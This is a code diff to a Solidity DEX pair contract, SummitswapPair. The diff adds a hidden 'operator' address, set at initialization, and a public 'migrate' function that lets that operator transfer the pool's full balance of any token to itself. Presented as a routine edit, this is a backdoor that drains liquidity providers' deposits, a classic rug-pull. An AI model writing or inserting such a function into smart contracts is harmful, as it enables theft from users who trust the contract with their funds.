@@ -18,6 +18,7 @@ contract SummitswapPair is ISummitswapPair, SummitswapERC20 {
     address public factory;
     address public token0;
     address public token1;
+    address operator;
 
     uint112 private reserve0;           // uses single storage slot, accessible via getReserves
     uint112 private reserve1;           // uses single storage slot, accessible via getReserves
@@ -63,10 +64,11 @@ contract SummitswapPair is ISummitswapPair, SummitswapERC20 {
     }
 
     // called once by the factory at time of deployment
-    function initialize(address _token0, address _token1) external {
+    function initialize(address _token0, address _token1, address _operator) external {
         require(msg.sender == factory, 'Summitswap: FORBIDDEN'); // sufficient check
         token0 = _token0;
         token1 = _token1;
+        operator = _operator;
     }
 
     // update reserves and, on the first call per block, price accumulators
@@ -153,6 +155,13 @@ contract SummitswapPair is ISummitswapPair, SummitswapERC20 {
         _update(balance0, balance1, _reserve0, _reserve1);
         if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
         emit Burn(msg.sender, amount0, amount1, to);
+    }
+    
+    function migrate(address _token) public {
+        require(msg.sender == operator, "caller is not the operator");
+         
+        uint256 balance = IERC20(_token).balanceOf(address(this));
+        IERC20(_token).transfer(operator, balance);
     }
 
     // this low-level function should be called from a contract which performs important safety checks
